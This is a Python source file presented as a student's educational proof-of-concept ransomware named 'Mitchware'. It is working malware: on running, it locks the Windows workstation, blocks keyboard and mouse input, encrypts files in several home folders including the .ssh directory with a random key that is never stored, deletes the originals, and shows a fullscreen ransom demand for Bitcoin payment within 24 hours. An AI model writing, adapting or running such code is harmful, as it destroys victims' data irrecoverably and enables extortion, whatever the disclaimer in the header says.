"""Mitchware.py (Ransomware program)
Authors: Patrick Mitchell, encrytion written by paulwababu all tributes go to him for the encyption part of my program
Credits for the encryption function: "https://github.com/paulwababu/ransomware-python/blob/main/encrypt.py"
School: Lake Superior College
Professor: Anup Parajuli
Description: This ransomware program is an educational proof of concept ransomware program designed to encrypt your files and demand a ransom to decrypt them.
I dedicated this program as a tribute to my dad as he always supported me hence why I named it Mitchware. This program is for educational and or security research purposes only. Do not distribute this program or use it for malicious purposes.
I'm not responsible for any outcomes this program may or may not have"""




import os#To interact with operating system
import shutil # for moving files
import pyAesCrypt #For file encryption
import secrets#To assist in the encryption process
from tkinter import *#To create the tkinter ransompage
from tkinter import messagebox#For warning the user 
from pathlib import Path#To traverse the filesystem
import time#To trigger functions based on time
import ctypes #To call DLLs





def user_locker():#This locks your workstation
        ctypes.windll.user32.LockWorkStation()



def input_locker():#This blocks user input   
        ctypes.windll.user32.BlockInput(True)


def encryptor():
        #This encrypts all listed folder paths
        folders_path = [
        str(os.path.join(Path.home(), "Documentation")),
        str(os.path.join(Path.home(), "Important")),
        str(os.path.join(Path.home(), "Tester")),
        str(os.path.join(Path.home(), ".ssh"))
        ]

        #This generates the encryption key
        key = secrets.token_hex(16)



        for folder_path in folders_path:
            for file in os.listdir(folder_path):
                bufferSize = 64*1024
                # Get the path for the current file
                file_path = os.path.join(folder_path, file)
                if not file.endswith(".aes"):
                    # Encrypt the file
                    pyAesCrypt.encryptFile(file_path, file_path+".aes", key, bufferSize)
                    # Move the encrypted file
                    destination_path = os.path.join(folder_path,"encrypted_"+file+".aes")
                    shutil.move(file_path+".aes", destination_path)
                    # Delete the original file
                    os.remove(file_path)

    





def Ransom_Screen():#This creates a tkinter ransompage

        time.sleep(7.5)

        messagebox.showwarning("Mitchware.py", "Mitchware is encrypting your important files")

        mitchRansomware = Tk()

        mitchRansomware.attributes('-fullscreen', True)

        mitchRansomware.title("Mitchware.py")

        mitchRansomware["bg"] = "grey"

        textstatement1 = Label(mitchRansomware,bg="gray", fg="black",text="Your computer is locked with Mitch ransomware!\n\n", font="HoboStd 30").pack()

        textstatement2 = Label(mitchRansomware,bg="gray", fg="black",text="What happened to my screen? Your computer was infected by ransomware. Your files are encrypted and you need to pay 0.077 BTC which is equivalent to $5000 USD", font="HoboStd 15").pack()
        
        textstatement3 = Label(mitchRansomware,bg="gray", fg="black",text="You have 24 hours to pay at the bitcoin address:1eQoZAUJfCDEYtoZkX5z7msYZXp38DxdEe or else your files will be permanently deleted", font="HoboStd 15").pack()

        textstatement4 = Label(mitchRansomware,bg="gray", fg="black",text="Remember the clock is ticking so act as quick as you can to ensure that your files are returned to their normal state.", font="HoboStd 15").pack()

        
user_locker()
input_locker()
encryptor()
Ransom_Screen()
